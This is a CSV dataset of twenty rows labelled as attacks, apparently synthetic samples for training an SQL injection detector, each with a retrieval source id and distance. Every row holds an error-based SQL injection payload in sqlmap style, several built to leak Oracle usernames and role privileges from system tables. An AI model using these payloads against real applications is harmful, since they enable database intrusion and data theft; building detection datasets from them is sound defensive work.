id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,error,"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000229,0.7600844183456723
SMOTE_000002,attack,error,-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,nearest_attack_euclidean,R000118,0.8804548402400556
SMOTE_000003,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000155,0.5378203184610292
SMOTE_000004,attack,error,"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """,nearest_attack_euclidean,R000234,1.1167394222530602
SMOTE_000005,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn",nearest_attack_euclidean,R000129,0.05514361311602352
SMOTE_000006,attack,error,"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000144,0.7952058559983467
SMOTE_000007,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000099,0.48869717593049794
SMOTE_000008,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000199,1.2116847850891383
SMOTE_000009,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0
SMOTE_000010,attack,error,"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",nearest_attack_euclidean,R000138,1.4973162280356145
SMOTE_000011,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0
SMOTE_000012,attack,error,"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx",nearest_attack_euclidean,R000303,0.077733436897607
SMOTE_000013,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,0.41492797088890593
SMOTE_000014,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'wqme'  =  'wqme",nearest_attack_euclidean,R000089,0.09744208098518344
SMOTE_000015,attack,error,"-2110' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000132,0.059295391545114026
SMOTE_000016,attack,error,"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000144,0.031098773683796137
SMOTE_000017,attack,error,"1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000098,0.4926802842374371
SMOTE_000018,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000037,0.09762114272999219
SMOTE_000019,attack,error,"1%""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000232,0.18641112941562218
SMOTE_000020,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R000219,0.7968647978290986
